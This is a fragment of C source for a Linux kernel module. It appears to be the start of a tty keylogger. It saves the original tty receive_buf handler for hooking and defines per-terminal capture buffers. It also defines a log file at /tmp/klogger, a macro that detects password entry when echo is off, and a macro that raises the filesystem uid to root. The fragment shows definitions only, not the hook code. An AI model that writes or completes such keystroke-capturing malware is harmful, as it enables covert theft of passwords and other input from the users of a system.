#include <linux/module.h>
#include <linux/init.h>
#include <asm/unistd.h>
#include <linux/tty.h>
#include <linux/slab.h>

#define MAX_TTY_CON 		8

#define CL_DEBUG
#define CL_INFO

#ifdef CL_DEBUG
	#define CL_DBG_PRINT(fmt,args...) printk("CL: %s  %d  "fmt,__FILE__,__LINE__,##args)
#else
	#define CL_DBG_PRINT(fmt,args...)
#endif

#ifdef CL_INFO
	#define CL_INFO_PRINT(fmt,args...) printk("CL info: %s  %d  "fmt,__FILE__,__LINE__,##args)
#else
	#define CL_INFO_PRINT(fmt,args...)
#endif

void (*old_receive_buf)(struct tty_struct *,const unsigned char *,char *,int);
#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }

#define TTY_NUMBER(tty) ((tty)->index + (tty)->driver->name_base)

#define TTY_INDEX(tty) tty->driver->type == \
            TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
            TTY_NUMBER(tty):TTY_NUMBER(tty)

#define MAX_TTY_CON 		8
#define MAX_PTS_CON 		512
#define ESC_CHAR 		    27
#define MAX_SPECIAL_CHAR_SZ    12
#define BEGIN_ROOT { int saved_fsuid = current->cred->fsuid; current->cred->fsuid = 0;
#define END_ROOT current->cred->fsuid = saved_fsuid; }

#define LOG_FILE "/tmp/klogger"

#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
#define MAX_BUFFER 256

#define append_c(t, s, n)    \
{                \
    t->lastpos += n;    \
    strncat(t->buf, s, n);    \
}

#define resetbuf(t)        \
{                \
    t->buf[0] = 0;        \
    t->lastpos = 0;        \
}


struct tty_logger{
    struct tty_struct * tty;
    spinlock_t pty_lock;
    char buf[MAX_BUFFER];
    unsigned int lastpos;
};
